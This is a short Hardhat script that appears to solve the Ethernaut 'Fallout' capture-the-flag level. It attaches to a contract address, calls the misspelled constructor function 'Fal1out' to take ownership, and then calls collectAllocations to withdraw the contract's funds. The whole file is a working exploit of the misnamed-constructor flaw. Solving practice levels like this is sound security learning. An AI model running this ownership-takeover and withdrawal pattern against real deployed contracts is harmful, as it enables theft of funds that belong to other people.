const hre = require("hardhat");

async function main() {
  const [Owner] = await ethers.getSigners();
  const Fallout = await hre.ethers.getContractFactory("Fallout");

  // attach your instance address
  const fallout = Fallout.attach("0x611334e82CeaAc147fc1A2D3eaa395235761Bc9d");
  const currentOwner = await fallout.owner();
  console.log(`Current Owner is  ${currentOwner}`);

  // constructor is misspelled
  const tx = await fallout.Fal1out({
    value: ethers.utils.parseEther("0.0001"),
  });
  await tx.wait(1);
  const NewOwner = await fallout.owner();
  console.log(`New Owner is  ${NewOwner}`);

  await fallout.collectAllocations();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
